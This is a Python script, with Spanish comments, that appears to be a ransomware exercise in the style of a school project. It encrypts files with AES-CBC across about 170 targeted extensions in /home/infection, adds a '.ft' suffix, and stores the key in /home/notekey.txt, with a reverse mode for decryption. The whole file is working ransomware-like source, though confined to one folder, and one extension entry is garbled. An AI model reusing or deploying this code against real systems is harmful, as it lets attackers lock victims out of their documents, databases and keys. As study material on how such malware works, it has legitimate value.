import os,sys
import glob # Se utiliza para devolver todas las rutas de archivo que coinciden con un patrón específico. Podemos usar glob para buscar un patrón de archivo específico, o quizás más útil, buscar archivos donde el nombre de archivo coincida con un patrón determinado usando caracteres comodín.
import argparse # Para poder crear el menu de ayuda
import base64 # Este módulo proporciona funciones para codificar datos binarios en caracteres ASCII imprimibles y decodificar dichas codificaciones en datos binarios
import shutil # Para poder copiar los archivos en un directorio diferente en el proceso de desencriptar en caso de que se indique una ruta diferente 
from Crypto.Cipher import AES # Para que funcione hay que instalar la bilbioteca PyCryptodome
from Crypto.Hash import SHA256
from Crypto import Random
from os import remove

# Genera una clave encriptada en file_name.key y encripta file_name
def encry(key, file_name, num_silent):
	with open(file_name, 'rb') as file:
		original = file.read()
	key = SHA256.new(key).digest()  # use SHA-256 over our key to get a proper-sized AES key
	IV = Random.new().read(AES.block_size)  # generate IV
	encryptor = AES.new(key, AES.MODE_CBC, IV)
	padding = AES.block_size - len(original) % AES.block_size  # calculate needed padding
	original += bytes([padding]) * padding  # Python 2.x: original += chr(padding) * padding
	encrypted = IV + encryptor.encrypt(original)  # store the IV at the beginning and encrypt
	with open(file_name, 'wb') as encrypted_file:
		encrypted_file.write(encrypted)
	if num_silent == 2:
		print ('The file ' + file_name + ' has been encrypted')
 
# Lee la clave encriptada de file_name.key y desencripta file_name
def decry(key, file_name):
	with open(file_name, 'rb') as enc_file:
		encrypted = enc_file.read()
	key = SHA256.new(key).digest()  # use SHA-256 over our key to get a proper-sized AES key
	IV = encrypted[:AES.block_size]  # extract the IV from the beginning
	decryptor = AES.new(key, AES.MODE_CBC, IV)
	original = decryptor.decrypt(encrypted[AES.block_size:])  # decrypt
	padding = original[-1]  # pick the padding value from the end; Python 2.x: ord(data[-1])
	if original[-padding:] != bytes([padding]) * padding:  # Python 2.x: chr(padding) * padding
		raise ValueError("Invalid padding...")
	with open(file_name, 'wb') as dec_file:
		dec_file.write(original[:-padding])
	print ('The file ' + file_name + ' -> has been decrypted')
   
# Filtra todos los ficheros con las extensiones que se encriptarán
def ft_check_extensions(num_silent):
	codigo = input("Enter a key to encrypt with at least 16 characters:")
	num_codigo = len(codigo)
	while num_codigo < 16:
		codigo = input("The key to encrypt must be at least 16 characters, enter the new key:")
		num_codigo = len(codigo)
	
	key = bytes(codigo, encoding = "utf-8")
	types = ['*.123', '*.jpeg', '*.rb', '*.602', '*.jpg', '*.rtf', '*.doc', '*.js', '*.sch', '*.3dm', '*.jsp', '*.sh', '*.3ds', '*.key', '*.sldm', '*.3g2', '*.lay', '*.sldm', '*.3gp', '*.lay6', '*.sldx', '*.7z', '*.ldf', '*.slk', '*.accdb', '*.m3u', '*.sln', '*.aes', '*.m4u', '*.snt', '*.ai', '*.max', '*.sql', '*.ARC', '*.mdb', '*.sqlite3', '*.asc', '*.mdf', '*.sqlitedb', '*.asf', '*.mid', '*.stc', '*.asm', '*.mkv', '*.std', '*.asp', '*.mml', '*.sti', '*.avi', '*.mov', '*.stw', '*.backup', '*.mp3', '*.suo', '*.bak', '*.mp4', '*.svg', '*.bat', '*.mpeg', '*.swf', '*.bmp', '*.mpg', '*.sxc', '*.brd', '*.msg', '*.sxd', '*.bz2', '*.myd', '*.sxi', '*.c', '*.myi', '*.sxm', '*.cgm', '*.nef', '*.sxw', '*.class', '*.odb', '*.tar', '*.cmd', '*.odg', '*.tbk', '*.cpp', '*.odp', '*.tgz', '*.crt', '*.ods', '*.tif', '*.cs', '*.odt', '*.tiff', '*.csr', '*.onetoc2', '*.txt', '*.csv', '*.ost', '*.uop', '*.db', '*.otg', '*.uot', '*.dbf', '*.otp', '*.vb', '*.dch', '*.ots', '*.vbs', '*.der\xe2\x80\x9d', '*.ott', '*.vcd', '*.dif', '*.p12', '*.vdi', '*.dip', '*.PAQ', '*.vmdk', '*.djvu', '*.pas', '*.vmx', '*.docb', '*.pdf', '*.vob', '*.docm', '*.vsd', '*.docx', '*.pfx', '*.vsdx', '*.dot', '*.php', '*.wav', '*.dotm', '*.pl', '*.wb2', '*.dotx', '*.png', '*.wk1', '*.dwg', '*.pot', '*.wks', '*.edb', '*.potm', '*.wma', '*.eml', '*.potx', '*.wmv', '*.fla', '*.ppam', '*.xlc', '*.flv', '*.pps', '*.xlm', '*.frm', '*.ppsm', '*.xls', '*.gif', '*.ppsx', '*.xlsb', '*.gpg', '*.ppt', '*.xlsm', '*.gz', '*.pptm', '*.xlsx', '*.h', '*.pptx', '*.xlt', '*.hwp', '*.ps1', '*.xltm', '*.ibd', '*.psd', '*.xltx', '*.iso', '*.pst', '*.xlw', '*.jar', '*.rar', '*.zip', '*.java', '*.raw']
	files_grabbed = []
	os.chdir("/home/infection")
	for files in types:
		files_grabbed.extend(glob.glob(files))
	if not files_grabbed:
		print("There are no files to decrypt")
	else:
		notekey = open("/home/notekey.txt", "w")
		notekey. write(codigo)
		notekey. close()
	for file in files_grabbed:
		encry(key, file, num_silent)
		os.rename('/home/infection/' + file, '/home/infection/' + file + '.ft')

# Ejecuta el programa salvo que se metan argumentos de argparse
def main():
	parser = argparse.ArgumentParser()
	parser.add_argument("-v", "--version", help="show version information", action='version', version='%(prog)s 2.1')
	parser.add_argument("-s", "--silent", help="silent mode", action="store_true")
	parser.add_argument("-r", "--reverse", help="decrypt the files", action="store_true")
	args = parser.parse_args()

	# Aquí procesamos lo que se tiene que hacer con cada argumento
	if args.reverse:
		codigo = input("Enter the same key to decrypt that you used to encrypt:")
		old_codigo = open("/home/notekey.txt", "r")
		mensage = old_codigo.read()
		old_codigo.close()
		while codigo != mensage:
			codigo = input("The key to decrypt does not match the key you encrypted with, enter the correct key:")
		key = bytes(codigo, encoding = "utf-8")
		new_path = input("Write the path where you want the decrypted files to be copied (if you want it to be in the same place where they are, do not write anything):")
		if not new_path or new_path == "/home/infection" or new_path == "/home/infection/":
			print ("The files will be decrypted in the /home/infection folder")
			types = ['*.123.ft', '*.jpeg.ft', '*.rb.ft', '*.602.ft', '*.jpg.ft', '*.rtf.ft', '*.doc.ft', '*.js.ft', '*.sch.ft', '*.3dm.ft', '*.jsp.ft', '*.sh.ft', '*.3ds.ft', '*.key.ft', '*.sldm.ft', '*.3g2.ft', '*.lay.ft', '*.sldm.ft', '*.3gp.ft', '*.lay6.ft', '*.sldx.ft', '*.7z.ft', '*.ldf.ft', '*.slk.ft', '*.accdb.ft', '*.m3u.ft', '*.sln.ft', '*.aes.ft', '*.m4u.ft', '*.snt.ft', '*.ai.ft', '*.max.ft', '*.sql.ft', '*.ARC.ft', '*.mdb.ft', '*.sqlite3.ft', '*.asc.ft', '*.mdf.ft', '*.sqlitedb.ft', '*.asf.ft', '*.mid.ft', '*.stc.ft', '*.asm.ft', '*.mkv.ft', '*.std.ft', '*.asp.ft', '*.mml.ft', '*.sti.ft', '*.avi.ft', '*.mov.ft', '*.stw.ft', '*.backup.ft', '*.mp3.ft', '*.suo.ft', '*.bak.ft', '*.mp4.ft', '*.svg.ft', '*.bat.ft', '*.mpeg.ft', '*.swf.ft', '*.bmp.ft', '*.mpg.ft', '*.sxc.ft', '*.brd.ft', '*.msg.ft', '*.sxd.ft', '*.bz2.ft', '*.myd.ft', '*.sxi.ft', '*.c.ft', '*.myi.ft', '*.sxm.ft', '*.cgm.ft', '*.nef.ft', '*.sxw.ft', '*.class.ft', '*.odb.ft', '*.tar.ft', '*.cmd.ft', '*.odg.ft', '*.tbk.ft', '*.cpp.ft', '*.odp.ft', '*.tgz.ft', '*.crt.ft', '*.ods.ft', '*.tif.ft', '*.cs.ft', '*.odt.ft', '*.tiff.ft', '*.csr.ft', '*.onetoc2.ft', '*.txt.ft', '*.csv.ft', '*.ost.ft', '*.uop.ft', '*.db.ft', '*.otg.ft', '*.uot.ft', '*.dbf.ft', '*.otp.ft', '*.vb.ft', '*.dch.ft', '*.ots.ft', '*.vbs.ft', '*.der\xe2\x80\x9d.ft', '*.ott.ft', '*.vcd.ft', '*.dif.ft', '*.p12.ft', '*.vdi.ft', '*.dip.ft', '*.PAQ.ft', '*.vmdk.ft', '*.djvu.ft', '*.pas.ft', '*.vmx.ft', '*.docb.ft', '*.pdf.ft', '*.vob.ft', '*.docm.ft', '*.vsd.ft', '*.docx.ft', '*.pfx.ft', '*.vsdx.ft', '*.dot.ft', '*.php.ft', '*.wav.ft', '*.dotm.ft', '*.pl.ft', '*.wb2.ft', '*.dotx.ft', '*.png.ft', '*.wk1.ft', '*.dwg.ft', '*.pot.ft', '*.wks.ft', '*.edb.ft', '*.potm.ft', '*.wma.ft', '*.eml.ft', '*.potx.ft', '*.wmv.ft', '*.fla.ft', '*.ppam.ft', '*.xlc.ft', '*.flv.ft', '*.pps.ft', '*.xlm.ft', '*.frm.ft', '*.ppsm.ft', '*.xls.ft', '*.gif.ft', '*.ppsx.ft', '*.xlsb.ft', '*.gpg.ft', '*.ppt.ft', '*.xlsm.ft', '*.gz.ft', '*.pptm.ft', '*.xlsx.ft', '*.h.ft', '*.pptx.ft', '*.xlt.ft', '*.hwp.ft', '*.ps1.ft', '*.xltm.ft', '*.ibd.ft', '*.psd.ft', '*.xltx.ft', '*.iso.ft', '*.pst.ft', '*.xlw.ft', '*.jar.ft', '*.rar.ft', '*.zip.ft', '*.java.ft', '*.raw.ft']
			files_grabbed = []
			os.chdir("/home/infection")
			for files in types:
				files_grabbed.extend(glob.glob(files))
			for file in files_grabbed:
				new_name = file.removesuffix('.ft')
				os.rename('/home/infection/' + file, '/home/infection/' + new_name)
				decry(key, new_name)
		elif os.path.exists(new_path) == False:
			print ("The path you have indicated does not exist, decryption aborted")
			exit()
		else:
			if new_path[:-1] != "/":
				new_path += '/'
			print ("The files will be decrypted in the " + new_path + " folder")
			types = ['*.123.ft', '*.jpeg.ft', '*.rb.ft', '*.602.ft', '*.jpg.ft', '*.rtf.ft', '*.doc.ft', '*.js.ft', '*.sch.ft', '*.3dm.ft', '*.jsp.ft', '*.sh.ft', '*.3ds.ft', '*.key.ft', '*.sldm.ft', '*.3g2.ft', '*.lay.ft', '*.sldm.ft', '*.3gp.ft', '*.lay6.ft', '*.sldx.ft', '*.7z.ft', '*.ldf.ft', '*.slk.ft', '*.accdb.ft', '*.m3u.ft', '*.sln.ft', '*.aes.ft', '*.m4u.ft', '*.snt.ft', '*.ai.ft', '*.max.ft', '*.sql.ft', '*.ARC.ft', '*.mdb.ft', '*.sqlite3.ft', '*.asc.ft', '*.mdf.ft', '*.sqlitedb.ft', '*.asf.ft', '*.mid.ft', '*.stc.ft', '*.asm.ft', '*.mkv.ft', '*.std.ft', '*.asp.ft', '*.mml.ft', '*.sti.ft', '*.avi.ft', '*.mov.ft', '*.stw.ft', '*.backup.ft', '*.mp3.ft', '*.suo.ft', '*.bak.ft', '*.mp4.ft', '*.svg.ft', '*.bat.ft', '*.mpeg.ft', '*.swf.ft', '*.bmp.ft', '*.mpg.ft', '*.sxc.ft', '*.brd.ft', '*.msg.ft', '*.sxd.ft', '*.bz2.ft', '*.myd.ft', '*.sxi.ft', '*.c.ft', '*.myi.ft', '*.sxm.ft', '*.cgm.ft', '*.nef.ft', '*.sxw.ft', '*.class.ft', '*.odb.ft', '*.tar.ft', '*.cmd.ft', '*.odg.ft', '*.tbk.ft', '*.cpp.ft', '*.odp.ft', '*.tgz.ft', '*.crt.ft', '*.ods.ft', '*.tif.ft', '*.cs.ft', '*.odt.ft', '*.tiff.ft', '*.csr.ft', '*.onetoc2.ft', '*.txt.ft', '*.csv.ft', '*.ost.ft', '*.uop.ft', '*.db.ft', '*.otg.ft', '*.uot.ft', '*.dbf.ft', '*.otp.ft', '*.vb.ft', '*.dch.ft', '*.ots.ft', '*.vbs.ft', '*.der\xe2\x80\x9d.ft', '*.ott.ft', '*.vcd.ft', '*.dif.ft', '*.p12.ft', '*.vdi.ft', '*.dip.ft', '*.PAQ.ft', '*.vmdk.ft', '*.djvu.ft', '*.pas.ft', '*.vmx.ft', '*.docb.ft', '*.pdf.ft', '*.vob.ft', '*.docm.ft', '*.vsd.ft', '*.docx.ft', '*.pfx.ft', '*.vsdx.ft', '*.dot.ft', '*.php.ft', '*.wav.ft', '*.dotm.ft', '*.pl.ft', '*.wb2.ft', '*.dotx.ft', '*.png.ft', '*.wk1.ft', '*.dwg.ft', '*.pot.ft', '*.wks.ft', '*.edb.ft', '*.potm.ft', '*.wma.ft', '*.eml.ft', '*.potx.ft', '*.wmv.ft', '*.fla.ft', '*.ppam.ft', '*.xlc.ft', '*.flv.ft', '*.pps.ft', '*.xlm.ft', '*.frm.ft', '*.ppsm.ft', '*.xls.ft', '*.gif.ft', '*.ppsx.ft', '*.xlsb.ft', '*.gpg.ft', '*.ppt.ft', '*.xlsm.ft', '*.gz.ft', '*.pptm.ft', '*.xlsx.ft', '*.h.ft', '*.pptx.ft', '*.xlt.ft', '*.hwp.ft', '*.ps1.ft', '*.xltm.ft', '*.ibd.ft', '*.psd.ft', '*.xltx.ft', '*.iso.ft', '*.pst.ft', '*.xlw.ft', '*.jar.ft', '*.rar.ft', '*.zip.ft', '*.java.ft', '*.raw.ft']
			files_grabbed = []
			os.chdir("/home/infection")
			for files in types:
				files_grabbed.extend(glob.glob(files))
			for file in files_grabbed:
				shutil.copy('/home/infection/' + file, new_path + file)
				os.chdir(new_path)
				new_name = file.removesuffix('.ft')
				os.rename(new_path + file, new_path + new_name)
				decry(key, new_name)
	else:
		if args.silent:
			ft_check_extensions(1)
		else:
			ft_check_extensions(2)
 
if __name__ == "__main__":
	main()
